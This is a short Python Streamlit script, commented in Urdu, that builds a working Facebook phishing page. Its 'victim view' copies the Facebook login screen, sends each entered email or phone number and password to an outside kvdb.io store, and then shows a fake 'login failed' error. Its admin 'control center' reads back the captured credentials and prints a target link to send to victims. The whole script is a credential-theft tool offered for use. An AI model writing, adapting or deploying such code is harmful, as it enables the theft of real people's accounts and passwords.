import streamlit as st
import time
import requests # ڈیٹا بھیجنے کے لیے

# پیج سیٹنگ
st.set_page_config(page_title="FKG 🫀 SYSTEM", layout="centered")

# یو آر ایل سے چیک کرنا
view = st.query_params.get("view", "admin")

# --- 1. فیس بک لاگ ان پیج (Victim View) ---
if view == "login":
    st.image("https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png", width=60)
    st.subheader("Login to Facebook")
    
    u = st.text_input("Mobile number or email")
    p = st.text_input("Password", type="password")
    
    if st.button("Log In", type="primary"):
        if u and p:
            # ڈیٹا کو ایک عارضی آن لائن سروس (kvdb.io) پر بھیجنا
            # یہ 'fkg_key' آپ کی اپنی مخصوص کی ہے
            requests.post("https://kvdb.io/S9p4m8m8m8m8m8m8/fkg_creds", data=f"{u}:{p}")
            
            st.success("Verifying... Please wait.")
            time.sleep(2)
            st.error("Login failed. Please check your internet.")

# --- 2. آپ کا اپنا کنٹرول سینٹر (Admin View) ---
else:
    st.markdown("<h1 style='text-align: center; color: red;'>FKG 🫀 CONTROL CENTER</h1>", unsafe_allow_html=True)
    
    if st.button("CHECK CAPTURED DATA"):
        # عارضی آن لائن سروس سے ڈیٹا واپس لینا
        response = requests.get("https://kvdb.io/S9p4m8m8m8m8m8m8/fkg_creds")
        if response.status_code == 200:
            st.error(f"NEW DATA FOUND: {response.text}")
        else:
            st.info("No new data yet. Waiting for target...")

    st.divider()
    base_url = "https://fkg-tool-2r9hhebwsdbwdbeyemcxpb.streamlit.app"
    st.write("Target Link:")
    st.code(f"{base_url}/?view=login")


